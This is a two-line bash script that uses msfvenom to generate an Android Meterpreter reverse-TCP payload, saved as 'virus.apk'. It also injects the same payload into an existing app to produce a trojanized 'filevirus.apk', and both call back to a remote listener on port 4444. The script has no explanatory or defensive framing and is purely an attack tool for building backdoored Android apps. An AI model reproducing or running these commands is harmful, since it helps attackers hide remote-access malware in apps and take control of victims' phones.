#!/bin/bash

msfvenom -p android/meterpreter/reverse_tcp lhost=1.2.3.4 lport=4444 R -o ./uploads/virus.apk
msfvenom -x ./uploads/file.apk -p android/meterpreter/reverse_tcp lhost=1.2.3.4 lport=4444 -o ./uploads/filevirus.apk
